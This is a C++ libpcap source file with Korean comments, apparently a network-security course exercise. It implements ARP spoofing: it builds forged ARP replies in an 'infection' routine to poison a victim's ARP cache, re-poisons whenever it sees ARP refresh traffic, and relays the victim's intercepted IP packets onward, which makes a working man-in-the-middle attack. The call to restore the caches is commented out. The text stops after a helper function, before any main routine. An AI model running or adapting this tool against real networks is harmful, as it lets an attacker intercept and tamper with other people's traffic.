#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <utility>
#include <map>
#include "ethhdr.h"
#include "arphdr.h"
// thread
#include <thread>
#include <chrono>
// getMyIp
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
//
#define SUCCESS 1
#define FAIL -1
#define INFINITY 1 << 30

#pragma pack(push, 1) 
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;

	// 복사 생성자
	EthArpPacket() {}
	EthArpPacket(const EthArpPacket& r) { memcpy(&(this->eth_), &(r.eth_), sizeof(EthArpPacket)); }

};
#pragma pack(pop)

using std::cout;
using std::ifstream;
using std::string;
using std::cerr;
using std::pair;
using std::vector;
using std::map;
using std::endl;

void usage() {
	cout << "syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]" << endl;
	cout << "sample : send-arp wlan0 192.168.10.2 192.168.10.1" << endl;
}

Mac getMyMac(char* dev) {
	// 리눅스의 경우
	// /sys/class/net/[dev]/address
	ifstream fin;
	string path = "/sys/class/net/" + string(dev) +"/address";
	fin.open(path);

	if (fin.fail()) {
		cerr << "Error: " << strerror(errno);
		return Mac::nullMac(); // FAIL이면 null 맥 리턴
		//return FAIL;
	}

	string tmp;
	fin >> tmp;
	fin.close();

	return Mac(tmp);
	//return SUCCESS;
}

EthArpPacket fillPacket(Mac& smac1, Mac& dmac, Mac& smac2, Ip& sip, Mac& tmac, Ip& tip, uint16_t type) {
	EthArpPacket packet;
	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac1;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(type);
	packet.arp_.smac_ = smac2;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = tmac;
	packet.arp_.tip_ = htonl(tip);

	return packet;
}


int findFlag = 0;

// 쓰레드로 실행될 것
// 리턴값을 ... 
// 리턴 안해도 되긴 하는데
void sendARP(EthArpPacket packet, pcap_t* handle, int times, uint64_t sec) {
	
	for(int i = 0; i < times; i++) {
		if(findFlag) {
			cout << "sendARP end" << endl;
			return;
		}
		// critical section
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		//
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return;
			//return FAIL;
		}
		std::this_thread::sleep_for(std::chrono::seconds(sec)); // 마지막에는 필요 없는데 어케 해결할까 1. if  2. ??
	}
	cout << "sendARP end" << endl;
	return;
	//return SUCCESS;
}

int parsePacket(pcap_t* handle, EthArpPacket& send, map<Ip, Mac>& table, uint32_t time) {
	struct pcap_pkthdr* pkheader;
	const u_char* packet;


	// 타이머 구현하는 법
	// 1. 시작 시각하고 현재 시각의 차이를 구한다 -> sleep_for 내부도 이렇게 작동함 ㅋㅋ
	// 2. sleep_for을 쓰레드로 구현해놓고 어떤 전역 변수값으로 전달?
	// start
	auto startTime = std::chrono::system_clock::now();

	while (1) {
		auto endTime = std::chrono::system_clock::now();
		auto diff = std::chrono::duration_cast<std::chrono::seconds>(endTime-startTime);
		if(diff.count() > time) {
			cout << "timeout:: cannot receive reply packet" << endl;
			return FAIL;
		}
		// critical section
		int res = pcap_next_ex(handle, &pkheader, &packet);
		//
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return FAIL;
		}
		
		// ETH-ARP 패킷인지 확인하고 
		EthArpPacket header;
		memcpy(&header, packet, 42);
	
		// => ETH의 type정보를 확인
		if(header.eth_.type_ != htons(EthHdr::Arp)) continue;

		// reply 패킷인지 확인
		if(header.arp_.op_ != htons(ArpHdr::Reply)) continue;

		// send를 바탕으로 send에 대한 reply인지 확인
		if(send.eth_.smac_ != header.eth_.dmac_) continue;
		if(send.arp_.smac_ != header.arp_.tmac_) continue;
		if(send.arp_.sip_ != header.arp_.tip_) continue;
		if(send.arp_.tip_ != header.arp_.sip_) continue;

		header.arp_.sip_ = ntohl(header.arp_.sip_);
		table.insert({header.arp_.sip_, header.arp_.smac_});
		return SUCCESS;
	}
}

int resolveMac(pcap_t* handle, map<Ip, Mac>& table, Ip& sip, Ip& tip) {
	EthArpPacket packet = fillPacket(table.find(sip)->second, Mac::broadcastMac(), table.find(sip)->second, sip, Mac::nullMac(), tip, ArpHdr::Request);
	// 쓰레드로 1초에 1번씩 전송하도록 함 
	// 종료 변수 설정 안함
	findFlag = 0;
	std::thread t(sendARP, packet, handle, 10, 1);
	// 5초 지나고 타임 아웃
	// 쓰레드로 만들어서 join 끝나면 FAIL로~
	int res = parsePacket(handle, packet, table, 10); // main thread로 해도 될듯
	findFlag = 1;
	t.join();
	cout << "resolve end" << endl;
	return res;
}

Ip getMyIp(char* dev) {
	int fd;
    struct ifreq ifr;
 
    fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd < 0) {
		cerr << "Error: " << strerror(errno);
		return FAIL;
	}
    ifr.ifr_addr.sa_family = AF_INET;
   	strncpy(ifr.ifr_name, dev, IFNAMSIZ -1);
    
   	ioctl(fd, SIOCGIFADDR, &ifr);
	if(fd < 0) {
		cerr << "Error: " << strerror(errno);
		return FAIL;
	}
    close(fd);
     
    return Ip(ntohl(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr));
}

int getMyInfo(char* dev, map<Ip, Mac>& table) {
	Mac myMac = getMyMac(dev);
	if(myMac == Mac::nullMac()) return FAIL;
	table.insert({getMyIp(dev), myMac});
	return SUCCESS;
}

void recover(pcap_t* handle, map<Ip, Mac> table, Ip sender, Ip target) {
	EthArpPacket packet = fillPacket(table.find(target)->second, table.find(sender)->second, table.find(target)->second, target, table.find(sender)->second, sender, ArpHdr::Reply);
	sendARP(packet, handle, 3, 0);
}

void infection(pcap_t* handle, map<Ip, Mac> table, Ip me, Ip sender, Ip target, int times, uint64_t sec) {
	// EthArpPacket packet = fillPacket(table[0].second, table[1].second, table[0].second, table[2].first, table[1].second, table[1].first, ArpHdr::Reply);
	EthArpPacket packet = fillPacket(table.find(me)->second, table.find(sender)->second, table.find(me)->second, target, table.find(sender)->second, sender, ArpHdr::Reply);

	//cout << "infection start" << endl;
	findFlag = 0;
	std::thread t(sendARP, packet, handle, times, sec);
	t.detach();
		
	//t.join();

	//cout << "infection end" << endl;

	//recover(handle, table, sender, target);
	return;	
}

// infection 시켰으면 계속 감시해야 함.
// while문으로 돌려놓고 변수로 종료시키자
// 쓰레드
void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& IpTable, Ip& me) {
	struct pcap_pkthdr* pkheader;
	const u_char* packet;
	// relay용
	u_char paste_packet[0x2000];
	// parsePacket이랑 꼬이면 안됨
	// 해결책 선택
	// 1. parse(resolve)를 다 한 후에 공격을 한다
	// 벡터로 sender와 target을 묶기? 
	// 2. parse랑 watch를 통합한다.
	// 공유자원 문제 비스무리하게 .. 좀 복잡함.

	auto startTime = std::chrono::system_clock::now();
	while (1) {
		findFlag = 0;
		auto endTime = std::chrono::system_clock::now();
		auto diff = std::chrono::duration_cast<std::chrono::seconds>(endTime-startTime);
		if(diff.count() > 20) {
			break;
		}
	
		// critical section
		int res = pcap_next_ex(handle, &pkheader, &packet);
		//
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return;
		}
		
		EthArpPacket header;
		memcpy(&header, packet, 42);
	
		// IP 패킷인지 ARP인지
		// => ETH의 type정보를 확인

		
		if(header.eth_.type_ != htons(EthHdr::Arp)) {
			//cout << string(header.eth_.smac_) << ' ' << string(header.eth_.dmac_) << endl;
			// flow를 해야하는지 확인
			for(auto i : IpTable) {
				// sender 확인
				if(header.eth_.smac_ == ARPtable.find(i.first)->second) {
					// src mac me로 바꿔서 보냄
					// dst mac 을 target꺼로
					memcpy(paste_packet, packet, pkheader->len);
					Mac myMac = ARPtable.find(me)->second;
					memcpy(&paste_packet[6], &myMac, 6);
					Mac tMac = ARPtable.find(i.second)->second;
					memcpy(paste_packet, &tMac, 6);
					//cout << paste_packet[6] << endl;
					// sendARP(header, handle, 1, 0);
					// critical section
					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&paste_packet), pkheader->len);
					//
					if (res != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
						return;
						//return FAIL;
					}
					cout << "relay" << endl;
					break;
				}
			}
			continue;
		}
		
		// network byte order <-> host byte order
		
		cout << "this packet is ARP" << endl;
		// broadcast인지 
		cout << ntohl(header.arp_.sip_) << ' ' << ntohl(header.arp_.tip_) << endl;
		if(header.eth_.dmac_ == Mac::broadcastMac()) {
			for(auto i : IpTable) {
				// 1. sender의 target에 대한 broadcast
				if(ntohl(header.arp_.sip_) == uint32_t(i.first) && ntohl(header.arp_.tip_) == uint32_t(i.second)) {
					cout << "case 1" << endl;
					infection(handle, ARPtable, me, i.first, i.second, 3, 1);
					break;
				}

				// 2. target의 broadcast
				if(ntohl(header.arp_.sip_) == uint32_t(i.second)) {
					cout << "case 2" << endl;
					infection(handle, ARPtable, me, i.first, i.second, 3, 1);
					break;
				}
			}

		}
		// unicast인지
		else {
			for(auto i : IpTable) {
				// 3. sender -> target unicast
				if(header.arp_.sip_ == i.first && header.arp_.tip_ == i.second) {
					cout << "case 3" << endl;
					infection(handle, ARPtable, me, i.first, i.second, 3, 1);
					break;
				}
			}
			
		}

		// 4. target -> sender unicast => 인자를 2쌍 이상 받아서 처리하는 이유
	}
}


void initArg(char* argv[], Ip& sender, Ip& target) {
	sender = Ip(string(argv[0]));
	target = Ip(string(argv[1]));
}

void printTable(map<Ip, Mac>& table) {
	/*
	cout << "----Me----" << endl << "Ip:  " << string(table[0].first) << endl << "Mac: " << string(table[0].second) << endl;
	cout << "--Sender--" << endl << "Ip:  " << string(table[1].first) << endl << "Mac: " << string(table[1].second) << endl;
	cout << "--Target--" << endl << "Ip:  " << string(table[2].first) << endl << "Mac: " << string(table[2].second) << endl;
	*/
}
